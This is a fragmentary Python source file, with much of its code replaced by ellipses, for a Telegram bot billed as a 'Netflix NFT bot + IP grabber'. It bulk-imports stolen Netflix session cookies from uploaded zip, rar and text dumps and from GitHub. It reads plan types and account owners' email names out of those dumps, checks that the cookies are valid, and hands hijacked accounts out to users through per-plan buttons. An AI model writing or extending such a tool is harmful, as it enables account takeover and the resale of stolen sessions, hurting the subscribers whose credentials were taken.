...
try:
    ...
    RAR_AVAILABLE = False
    print("⚠️ rarfile not installed. RAR archives will be skipped.")
...
# ============================================
# COOKIE PARSING FUNCTIONS (extended)
# ============================================
...
def extract_plan_from_text(text):
    ...
    for line in lines:
        ...
        if "plan" in line:
            # try to find Premium, Basic, Standard, Temel (Turkish basic), Prémium, etc.
        ...
        if line.lower().startswith("username"):
            ...
            if len(parts) == 2:
                ...
                if email and email != "N/A":
                    # use email as name
                    return email.split("@")[0]  # use local part
...
def split_cookie_blocks(text):
    ...
    lines = text.splitlines()
    for line in lines:
        # if line is a separator (like '====' or '----' with length > 5)
...
def process_cookie_blocks(text):
    ...
    for block in blocks:
        ...
        if cookie_dict and cookie_dict.get(REQUIRED_COOKIE):
            plan = extract_plan_from_text(block)
            name = extract_account_name_from_text(block)
            # if no name, generate from first cookie value or timestamp
            if not name:
...
def show_netflix_button(message):
    ...
    # Add buttons for each plan with count
    ...
    # Optionally add a "Random" button (they didn't ask, but we can add as extra)
...
def handle_callback(call):
    if call.data.startswith("plan_"):
        ...
        if error:
            ...
            # Refresh buttons after removal
            show_netflix_button(call.message)  # not ideal, but we'll send new message
            return
...
# ============================================
# 📄 FILE UPLOAD – now handles .zip, .rar, .txt
# ============================================
...
def handle_document(message):
    try:
            ...
            try:
                with zipfile.ZipFile(io.BytesIO(downloaded_file)) as zf:
                    ...
                    for name in zf.namelist():
                        if name.endswith('.txt') or name.endswith('.cookie') or name.endswith('.netscape'):
        ...
        for block in blocks:
            cookie_dict = extract_cookie_dict(block)
            if not cookie_dict or not cookie_dict.get(REQUIRED_COOKIE):
                continue
            # Validate
...
# ============================================
# OTHER COMMANDS (existing and new)
# ============================================
    ...
    try:
        ...
        for name, vals in data.items():
            if all(k in vals for k in ["NetflixId", "SecureNetflixId", "nfvdid"]):
                ...
                cookies[name] = {
                    "NetflixId": vals["NetflixId"],
                    "SecureNetflixId": vals["SecureNetflixId"],
                    "nfvdid": vals["nfvdid"],
                    "plan": plan
                }
                added += 1
...
def process_load_github(message):
    ...
    try:
        ...
        for block in blocks:
            ...
            name = extract_account_name_from_text(block)
            if not name:
                name = "github_" + datetime.now().strftime("%Y%m%d%H%M%S%f")[:12]
            base_name = name
            counter = 1
            while name in cookies:
                name = f"{base_name}_{counter}"
        ...
        try:
            ...
            if response.status_code == 200:
                ...
                for block in blocks:
                    ...
                    name = extract_account_name_from_text(block)
                    if not name:
                        name = "autoload_" + datetime.now().strftime("%Y%m%d%H%M%S%f")[:12]
                    base_name = name
                    counter = 1
                    while name in cookies:
                        name = f"{base_name}_{counter}"
...
if __name__ == "__main__":
    print("=" * 60)
    print("🤖 NETFLIX NFT BOT + IP GRABBER - ULTIMATE EDITION")
    print("=" * 60)
    ...
    print(WATERMARK)
    print("=" * 60)
    # Auto-load from GitHub if URL set
    auto_load_github()
    cookies = load_cookies()
    users = load_json(USERS_FILE)
    ...
    print("=" * 60)
    print("\n📌 All Commands:")
    print("   /start, /netflix, /cookies, /myid, /ping, /help, /uptime, /getid, /plans")
